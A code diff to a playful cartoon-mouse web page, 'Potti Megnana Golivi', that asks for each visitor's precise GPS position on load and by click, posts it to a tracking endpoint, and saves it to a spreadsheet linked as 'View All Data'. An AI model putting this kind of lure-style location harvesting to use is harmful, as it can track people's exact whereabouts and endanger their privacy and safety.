@@ -133,7 +133,6 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading-spinner.active { display: block; }
         
-        /* GPS Accuracy Indicator */
         .gps-accuracy {
             display: none;
             padding: 8px 15px;
@@ -171,26 +170,32 @@
         
         <h1>🐭 Potti Megnana Golivi</h1>
         <p class="subtitle">Click to capture your <strong>exact GPS location</strong></p>
-        <span class="gps-badge">📡 oye</span>
+        <span class="gps-badge">📡 GPS Enabled</span>
         
         <div class="mickey-image" onclick="manualFetchLocation()">
             <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='90' fill='%23f5f5f5'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='150' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='100' cy='110' r='70' fill='%231a1a2e'/%3E%3Ccircle cx='70' cy='95' r='15' fill='white'/%3E%3Ccircle cx='130' cy='95' r='15' fill='white'/%3E%3Ccircle cx='75' cy='100' r='7' fill='%231a1a2e'/%3E%3Ccircle cx='125' cy='100' r='7' fill='%231a1a2e'/%3E%3Cellipse cx='100' cy='120' rx='12' ry='8' fill='%23ff6b6b'/%3E%3Cpath d='M85 130 Q100 140 115 130' stroke='white' stroke-width='3' fill='none'/%3E%3C/svg%3E" 
                  alt="Potti Megnana Golivi" id="mickeyImage" title="Click for exact GPS location!" />
-            <div class="click-hint">👆 Click </div>
+            <div class="click-hint">👆 Click for Exact GPS Location</div>
         </div>
         
-       
+        <div id="gpsAccuracy" class="gps-accuracy unknown">📡 Waiting for GPS...</div>
         
-       
+        <div class="loading-spinner" id="loadingSpinner"></div>
+        
+        <div class="button-group">
+            <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Get GPS Location</button>
+            <a href="/view-excel" target="_blank" class="btn btn-view-excel">📊 View All Data</a>
+        </div>
+        
+        <div class="excel-count" id="locationCount">📊 Total: 0 locations</div>
         
         <footer>
             <p>🐭 Exact GPS location saved to Excel</p>
-            <p style="font-size: 11px; margin-top: 5px;">📍 potti pilla</p>
+            <p style="font-size: 11px; margin-top: 5px;">📍 Accuracy depends on device GPS signal</p>
         </footer>
     </div>
     
     <script>
-        // ===== EXACT GPS LOCATION SCRIPT =====
         let autoFetched = false;
         
         function updateLocationCount() {
@@ -205,7 +210,6 @@
                 .catch(() => {});
         }
         
-        // GET EXACT GPS LOCATION
         function getExactLocation() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
@@ -214,7 +218,7 @@
                 }
                 
                 const options = {
-                    enableHighAccuracy: true,  // Force GPS
+                    enableHighAccuracy: true,
                     timeout: 15000,
                     maximumAge: 0
                 };
@@ -255,7 +259,6 @@
             });
         }
         
-        // AUTO-FETCH GPS ON LOAD
         async function autoFetchLocation() {
             if (autoFetched) return;
             
@@ -266,7 +269,6 @@
                 const location = await getExactLocation();
                 if (!location) throw new Error('No GPS signal');
                 
-                // Show GPS accuracy
                 showAccuracy(location.accuracy);
                 
                 const response = await fetch('/api/track-location', {
@@ -291,6 +293,9 @@
                     updateLocationCount();
                     autoFetched = true;
                     console.log('✅ Exact GPS saved:', location.latitude, location.longitude);
+                    document.getElementById('gpsAccuracy').textContent += ' ✅ Saved!';
+                } else {
+                    throw new Error(result.message || 'Save failed');
                 }
             } catch (error) {
                 console.error('GPS error:', error);
@@ -300,7 +305,6 @@
             }
         }
         
-        // MANUAL GPS FETCH
         async function manualFetchLocation() {
             autoFetched = false;
             
@@ -336,6 +340,8 @@
                     updateLocationCount();
                     autoFetched = true;
                     document.getElementById('gpsAccuracy').textContent += ' ✅ Saved!';
+                } else {
+                    throw new Error(result.message || 'Save failed');
                 }
             } catch (error) {
                 console.error('GPS error:', error);
@@ -369,7 +375,6 @@
             el.style.display = 'block';
         }
         
-        // ===== PAGE LOAD =====
         window.addEventListener('load', () => {
             console.log('🐭 Potti Megnana Golivi - Exact GPS Tracker loaded');
             updateLocationCount();
